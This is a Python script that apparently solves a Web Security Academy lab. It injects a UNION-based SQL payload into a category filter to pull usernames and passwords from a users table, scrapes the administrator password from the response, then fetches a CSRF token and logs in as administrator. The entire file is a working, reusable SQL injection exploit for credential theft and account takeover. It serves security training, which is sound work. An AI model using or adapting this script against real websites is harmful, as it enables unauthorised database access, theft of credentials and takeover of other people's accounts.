
import requests
from bs4 import BeautifulSoup
import re

BASE_URL = "https://0a7d001804d2f21889448760000300c9.web-security-academy.net"  # Change

session = requests.Session()

print("[+] Extracting administrator credentials...")

payload = "' UNION SELECT username, password FROM users--"  # See the payloads in the lab-notes

response = session.get(
    BASE_URL + "/filter",
    params={"category": payload},
    timeout=10
)

soup = BeautifulSoup(response.text, "html.parser")

page_text = soup.get_text(" ", strip=True)

match = re.search(
    r"administrator\s+(\S+)",
    page_text,
    re.IGNORECASE
)

if not match:
    print("[-] Administrator password not found.")
    print("[+] HTTP status:", response.status_code)
    print("[+] Page content:")
    print(page_text[:2000])
    exit()

admin_password = match.group(1)

print("[+] Administrator password extracted!")

print("[+] Getting CSRF token...")

login_page = session.get(BASE_URL + "/login", timeout=10)

login_soup = BeautifulSoup(login_page.text, "html.parser")

csrf_input = login_soup.find("input", {"name": "csrf"})

if not csrf_input:
    print("[-] CSRF token not found.")
    exit()

csrf_token = csrf_input["value"]

print("[+] Logging in as administrator...")

login_data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": admin_password
}

login_response = session.post(
    BASE_URL + "/login",
    data=login_data,
    timeout=10
)

account = session.get(
    BASE_URL + "/my-account",
    timeout=10
)

if "Congratulations, you solved the lab!" in account.text:
    print("\n[SUCCESS] LAB SOLVED!")
else:
    print("\n[-] Lab not solved.")
    print("[+] Login status:", login_response.status_code)
    print("[+] Account status:", account.status_code)

